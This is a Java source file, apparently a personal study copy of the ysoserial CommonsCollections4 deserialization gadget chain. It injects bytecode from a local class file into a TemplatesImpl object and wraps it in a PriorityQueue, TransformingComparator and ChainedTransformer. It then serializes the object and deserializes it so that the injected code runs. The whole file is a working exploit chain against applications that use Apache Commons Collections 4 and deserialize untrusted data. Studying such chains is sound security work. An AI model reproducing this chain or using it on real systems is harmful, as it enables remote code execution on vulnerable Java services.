package com.sec.cwm.base.ysoserial;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

public class CC4 {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }
    public static String bytecode(String filename) throws Exception {
        File file=new File(filename);
        FileInputStream fis = new FileInputStream(file);
        byte[] bytes = new byte[(int) file.length()];
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        int a=0;
        while ((a = fis.read(bytes)) != -1) {
            // 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的
            // 下标0开始截取，a表示输入流read到的字节数。
            out.write(bytes, 0, a);
        }
        final Base64.Encoder encoder = Base64.getEncoder();
        String encodedText = encoder.encodeToString(bytes);
        return encodedText;
    }
    public static void main(String[] args) throws Exception {
        String bytecode=bytecode("C:\\Users\\CWM\\IdeaProjects\\test\\src\\main\\java\\com\\sec\\cwm\\base\\HelloTempImpl.class");
        byte[] code = Base64.getDecoder().decode(bytecode);
        TemplatesImpl templates=new TemplatesImpl();
        setFieldValue(templates,"_bytecodes",new byte[][]{code});
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(templates, "_name", "HelloTempImpl");
        Transformer[] TransformMap=new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
        };
        Transformer[] fakeTransformers = new Transformer[] {new
                ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);
        Comparator comparator=new TransformingComparator(transformerChain);
        PriorityQueue priorityQueue=new PriorityQueue(1,comparator);
        priorityQueue.add(1);
        priorityQueue.add(1);
        setFieldValue(transformerChain,"iTransformers",TransformMap);
        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(priorityQueue);
        oos.close();
        ObjectInputStream ois=new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        ois.readObject();
    }
}
